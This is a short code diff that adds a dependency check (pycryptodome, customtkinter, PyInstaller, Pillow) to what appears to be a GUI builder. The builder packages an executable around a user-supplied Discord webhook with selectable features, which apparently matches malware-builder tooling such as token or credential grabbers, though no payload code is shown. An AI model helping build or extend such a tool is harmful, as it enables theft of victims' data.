@@ -176,7 +176,33 @@ def update_feature_config(selected_features: list[str]) -> bool:
 
     return True
 
+def check_dependencies():
+    """Verify required packages are installed before building."""
+    required = {
+        "Crypto.Cipher": "pycryptodome",
+        "customtkinter": "customtkinter",
+        "PyInstaller": "pyinstaller",
+        "PIL": "pillow",
+    }
+    missing = []
+    for mod, pkg in required.items():
+        try:
+            __import__(mod)
+        except ImportError:
+            missing.append(pkg)
+    if missing:
+        msg = (
+            "Missing required dependencies:\n  " + "\n  ".join(missing) +
+            "\n\nInstall them with:\n  pip install " + " ".join(missing)
+        )
+        messagebox.showerror("Missing Dependencies", msg)
+        return False
+    return True
+
 def build_exe():
+    if not check_dependencies():
+        return
+
     webhook = entry.get().strip()
     if not validate_webhook(webhook):
         messagebox.showerror("Auth Error", "Please provide a valid Discord Webhook URL.")
